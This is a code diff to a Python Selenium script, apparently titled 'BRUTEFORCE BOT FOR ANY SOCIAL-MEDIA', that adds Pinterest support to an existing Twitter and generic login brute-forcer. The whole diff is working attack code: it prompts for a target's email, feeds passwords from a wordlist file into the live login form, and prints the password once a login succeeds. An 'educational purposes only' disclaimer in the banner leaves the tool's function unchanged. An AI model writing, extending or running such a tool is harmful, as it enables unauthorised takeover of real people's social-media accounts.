@@ -1,5 +1,5 @@
 """
-Social-Media Bruteforcer
+BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
 @AUTHOR crypt0sploit
 @DATE 1 Mar 2019
 """
@@ -29,8 +29,7 @@ class brute_bot(object):
         pass_found = False
         driver.get(self.site)
 
-
-        if sys.argv[1] != "twitter":
+        if sys.argv[1] != "twitter" and sys.argv[1] != "pinterest":
             email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
             email_box.clear()
             email_box.send_keys(self.email)
@@ -52,7 +51,31 @@ class brute_bot(object):
                             print(f'Password is >> {old} ')
                             break
 
-        else:
+        elif sys.argv[1] == "pinterest":
+            loginbtn = driver.find_element_by_class_name('RCK')
+            loginbtn.click()
+            email_box = driver.find_element_by_xpath(f"//input[@id='{self.email_field}']")
+            email_box.clear()
+            email_box.send_keys(self.email)  
+
+            while not pass_found:
+                time.sleep(3)
+                for i in self.password:
+                    try:
+                        password_box = driver.find_element_by_xpath(f"//input[@id='{self.pass_field}']")
+                        password_box.clear()
+                        password_box.send_keys(i)
+                        pyautogui.press('enter')
+                        time.sleep(4)
+                        old = i 
+                        print(f"Trying - {i}") 
+                    except NoSuchElementException: 
+                        pass_found = True 
+                        if pass_found == True: 
+                            print(f'Password is >> {old} ')
+                            break
+
+        elif sys.argv[1] == "twitter":
             email_box = driver.find_element_by_class_name(f'{self.email_field}')
             email_box.clear()
             email_box.send_keys(self.email) 
@@ -85,6 +108,9 @@ banner = """\n\t
                                                          
             AUTHOR --> crypt0sploit ( Adrian )
             INSTAGRAM --> _adyadrian_aa
+
+        I'M NOT RESPONSABLE FOR ANY OF YOUR ACTIONS!
+            USE FOR EDUCATIONAL PURPOSES ONLY!
 
 """
 
@@ -137,6 +163,18 @@ def main_menu():
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield)
         execute.bruteforcer()
+
+    elif sys.argv[1] == "pinterest":
+        site = "https://www.pinterest.com/"
+        print(banner)
+        print("Waking up BOT...")
+        efield = 'email'
+        pfield = 'password'
+        email1 = str(input("\nThe Email of the Target >> "))
+        target = open(sys.argv[2], 'r')
+        readpass = target.readlines()
+        execute = brute_bot(email1, readpass, site, efield, pfield)
+        execute.bruteforcer()       
 
     else:
         print("Wrong argv !!")
